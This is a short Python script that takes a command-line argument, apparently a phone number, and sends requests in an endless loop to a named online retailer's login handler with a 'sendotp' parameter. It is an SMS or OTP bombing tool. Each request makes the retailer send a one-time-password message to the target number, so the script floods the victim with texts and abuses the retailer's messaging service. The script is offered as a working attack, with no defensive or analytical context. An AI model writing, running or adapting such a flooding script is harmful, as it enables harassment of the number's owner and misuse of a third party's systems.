import requests
import sys

url = 'https://www.naturesbasket.co.in/Handlers/LoginRegistrationMaster.ashx?sendotp='+sys.argv[1]

print(url)

while(True):
    print(requests.get(url))
